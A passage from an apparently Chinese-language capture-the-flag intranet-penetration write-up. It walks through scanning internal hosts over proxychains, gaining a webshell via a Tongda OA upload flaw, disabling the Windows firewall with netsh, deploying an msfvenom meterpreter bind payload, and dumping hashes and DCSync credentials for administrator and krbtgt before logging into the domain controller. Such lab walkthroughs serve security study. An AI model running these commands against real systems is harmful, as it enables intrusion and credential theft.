<div class="highlight"><pre><span></span><span class="n">proxychains</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sT</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.1.130</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span><span class="p">,</span><span class="mi">89</span><span class="p">,</span><span class="mi">8000</span><span class="p">,</span><span class="mi">9090</span><span class="p">,</span><span class="mi">1433</span><span class="p">,</span><span class="mi">1521</span><span class="p">,</span><span class="mi">3306</span><span class="p">,</span><span class="mi">5432</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">443</span><span class="p">,</span><span class="mi">873</span><span class="p">,</span><span class="mi">5984</span><span class="p">,</span><span class="mi">6379</span><span class="p">,</span><span class="mi">7001</span><span class="p">,</span><span class="mi">7002</span><span class="p">,</span><span class="mi">9200</span><span class="p">,</span><span class="mi">9300</span><span class="p">,</span><span class="mi">12111</span><span class="p">,</span><span class="mi">27017</span><span class="p">,</span><span class="mi">27018</span><span class="p">,</span><span class="mi">50000</span><span class="p">,</span><span class="mi">50070</span><span class="p">,</span><span class="mi">50030</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">2601</span><span class="p">,</span><span class="mi">3389</span> <span class="o">--</span><span class="n">open</span>
</pre></div>
<p>这里可以看到许多端口开放但是都显示timeout，只有一个80端口能够访问到，可以判断内网主机开了防火墙</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150735-8c81b35e-49fc-1.png"/></p>
<h3 data-content="1" id="c193856c8a7de6bf0a19ffc119d78a28">通达oa上传漏洞getshell</h3>
<p>使用tongda_shell.py</p>
<p><a href="https://github.com/Al1ex/TongDa-RCE" target="_blank">https://github.com/Al1ex/TongDa-RCE</a></p>
<div class="highlight"><pre><span></span><span class="n">proxychains</span> <span class="n">python3</span> <span class="n">tongda_shell</span><span class="o">.</span><span class="n">py</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">1.130</span><span class="o">/</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150736-8d094bde-49fc-1.png"/></p>
<p>访问一下能够访问到</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150738-8e0b149a-49fc-1.png"/></p>
<p>在蚁剑上设置代理</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150740-8fa051f8-49fc-1.png"/></p>
<p>添加php测试连接成功</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150741-903c383e-49fc-1.png"/></p>
<p>进入文件查看</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150744-9190d7e4-49fc-1.png"/></p>
<h3 data-content="1" id="81d2a3689173a8839f211822c269fd8b">对通达oa服务器信息搜集</h3>
<p>上传shell后执行不了命令</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150746-9320eac2-49fc-1.png"/></p>
<p>这里可以用<code>ipconfig &gt; cmd.txt</code>命令查看</p>
<p>这里我为了方便上传一个php大马上去执行命令</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150749-94f20714-49fc-1.png"/></p>
<p>火狐访问下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150751-963accbe-49fc-1.png"/></p>
<p>进入大马进行信息搜集</p>
<p>首先<code>whoami</code>查看权限，system权限</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150752-96970d62-49fc-1.png"/></p>
<p>首先看到DNS服务器为<code>attack.local</code>初步判断有内网，后面看到了双网卡存在</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150754-97ad82c6-49fc-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150755-9823fc30-49fc-1.png"/></p>
<p>查看一下开放的端口，跟之前nmap扫描的情况大致相同</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150756-98c0b548-49fc-1.png"/></p>
<p><code>tasklist /svc</code>对比下杀软情况发现有360全家桶</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150757-997a5642-49fc-1.png"/></p>
<h3 data-content="1" id="371a59488551e2a858b042cf69af8a5a">关闭oa系统自带防火墙</h3>
<p>这里我在没有关闭firewall之前用nmap连接445端口是连接不到的</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150758-99f883d2-49fc-1.png"/></p>
<p>命令行关闭windows firewall</p>
<div class="highlight"><pre><span></span><span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">set</span> <span class="n">allprofiles</span> <span class="n">state</span> <span class="n">off</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150758-9a5f7d94-49fc-1.png"/></p>
<p>关闭之后即可连接到445端口</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151007-e6db2fe2-49fc-1.png"/></p>
<h3 data-content="1" id="c60eaefaf228f86d939e80c32719b6e6">msf正向木马拿到meterpreter</h3>
<p>首先msf生成一个正向连接exe</p>
<div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">bind_tcp</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">6666</span> <span class="o">-</span><span class="n">f</span> <span class="n">exe</span> <span class="o">&gt;</span> <span class="n">abc</span><span class="p">.</span><span class="n">exe</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151008-e767c074-49fc-1.png"/></p>
<p>msf开启监听</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151008-e7d83700-49fc-1.png"/></p>
<p>上传文件到oa系统</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151010-e8fa95e2-49fc-1.png"/></p>
<p>运行即可成功弹回session</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151012-e9c84032-49fc-1.png"/></p>
<h3 data-content="1" id="a155bb66a571b5d1d7f4b43ee04abf19">收集内网域的信息</h3>
<p><code>ifconfig</code>可以看到是双网卡</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151013-ea96f896-49fc-1.png"/></p>
<p><code>migrate</code>进行进程迁移后使用<code>hashdump</code>抓取hash</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151014-eaff9220-49fc-1.png"/></p>
<p>尝试使用mimikatz的<code>msv</code>命令获取明文，这里可以看到明文没有抓出来</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151015-eb870f20-49fc-1.png"/></p>
<p><code>net time</code>定位域控</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151016-ec1d64a2-49fc-1.png"/></p>
<p><code>nltest /domain_trusts</code>定位域</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151016-ec9f5462-49fc-1.png"/></p>
<p><code>net user /domain</code>查看域内用户</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151022-efe39c8c-49fc-1.png"/></p>
<p><code>net group /domain</code>查看域内用户组</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151023-f061dce6-49fc-1.png"/></p>
<p><code>net localgroup administrators /domain</code>查看登陆过主机的管理员</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151026-f23d60a8-49fc-1.png"/></p>
<p><code>net group "domain controllers" /domain</code>查看域控制器</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151058-0575a93c-49fd-1.png"/></p>
<p>运用msf内置模块定位域控</p>
<div class="highlight"><pre><span></span><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_domain</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151059-05d93308-49fd-1.png"/></p>
<p>查看登录的用户</p>
<div class="highlight"><pre><span></span><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_logged_on_users</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151100-06947802-49fd-1.png"/></p>
<p>或者shell直接进入目录下查看</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151101-075adc72-49fd-1.png"/></p>
<p>查看组信息</p>
<div class="highlight"><pre><span></span><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_ad_groups</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151108-0b2dd20a-49fd-1.png"/></p>
<p>查看域的token</p>
<div class="highlight"><pre><span></span><span class="n">run</span> <span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_domain_tokens</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151112-0daed83a-49fd-1.png"/></p>
<h3 data-content="1" id="7cd5918d31d8bea8174df779c4fc45ec">对域控进行端口扫描</h3>
<p>这里<code>ps</code>寻找一个域管的进程，我这里选择的是2568，然后使用<code>steal_token 2568</code>提升为域管权限</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151330-5feacbc2-49fd-1.png"/></p>
<p>然后就可以拿到一个域管的shell进程</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151331-60cd6356-49fd-1.png"/></p>
<p>这里我先exit退出一下用nmap对域控进行端口扫描</p>
<p><code>rev2self</code>清除当前权限，然后用<code>run autoroute -s 10.10.10.0/24</code>添加一个路由表</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151346-69981cb0-49fd-1.png"/></p>
<p>使用proxychains配合nmap进行扫描，这里我扫描88、389都能够连接成功说明为域控</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151400-720109fc-49fd-1.png"/></p>
<p>继续扫描一些常用端口</p>
<div class="highlight"><pre><span></span><span class="n">proxychains</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sT</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.10.165</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">89</span><span class="p">,</span><span class="mi">8000</span><span class="p">,</span><span class="mi">9090</span><span class="p">,</span><span class="mi">1433</span><span class="p">,</span><span class="mi">1521</span><span class="p">,</span><span class="mi">3306</span><span class="p">,</span><span class="mi">5432</span><span class="p">,</span><span class="mi">445</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">443</span><span class="p">,</span><span class="mi">873</span><span class="p">,</span><span class="mi">5984</span><span class="p">,</span><span class="mi">6379</span><span class="p">,</span><span class="mi">7001</span><span class="p">,</span><span class="mi">7002</span><span class="p">,</span><span class="mi">9200</span><span class="p">,</span><span class="mi">9300</span><span class="p">,</span><span class="mi">12111</span><span class="p">,</span><span class="mi">27017</span><span class="p">,</span><span class="mi">27018</span><span class="p">,</span><span class="mi">50000</span><span class="p">,</span><span class="mi">50070</span><span class="p">,</span><span class="mi">50030</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">2601</span><span class="p">,</span><span class="mi">3389</span> <span class="o">--</span><span class="n">open</span>
</pre></div>
<p>这里看到开放了88、135、445、3389端口</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151411-7866b68e-49fd-1.png"/></p>
<h3 data-content="1" id="e836c799fa60c7cc96953e89ccbabd51">利用kiwi dcsync_ntlm获取域管理员hash</h3>
<p>先加载mimikatz、kiwi，这里需要用到<code>dcsync_ntlm</code>模块，这里没有迁移到域管进程，所以失败</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151417-7be7bbfa-49fd-1.png"/></p>
<p><code>steal_token 3196</code>迁移到域管进程，然后执行<code>dcsync_ntlm administrator</code>获取域管hash</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151433-859d617c-49fd-1.png"/></p>
<p>执行<code>dcsync_ntlm krbtgt</code>获取krbtgt用户hash</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151435-868b1c28-49fd-1.png"/></p>
<p>因为开了445端口所以考虑使用<code>exploit/windows/smb/psexec</code>进行hash传递</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151437-881b70c4-49fd-1.png"/></p>
<p>这里尝试了下直接用<code>psexec</code>传递不过去</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151438-8890f16e-49fd-1.png"/></p>
<h3 data-content="1" id="54f633f357888943dd2f2141f6e8f8ac">利用sockscap64设置代理登录域控</h3>
<p>这里直接拿hash到cmd5官网进行解密得到密码为!@#QWEasd123.</p>
<p>先使用proxychain看登录得上去不</p>
<div class="highlight"><pre><span></span><span class="n">proxychain</span> <span class="n">rdesktop</span> <span class="mf">10.10.10.165</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151450-8ffc5eca-49fd-1.png"/></p>
<p>这里报错是因为只有windows能够登录远程桌面</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151453-918997c6-49fd-1.png"/></p>
<p>这里代理设置为socks4a连接域控</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151502-9718bcda-49fd-1.png"/></p>
<p>mstsc连接即可</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151713-e4ca6fdc-49fd-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151720-e90b05e8-49fd-1.png"/></p>
<p><code>dir</code>当前目录，<code>type flag.txt</code>即可拿到flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012151721-e990cf52-49fd-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20220307152549-cff96bde-9de7-1.png"/></p>
</div>
</div>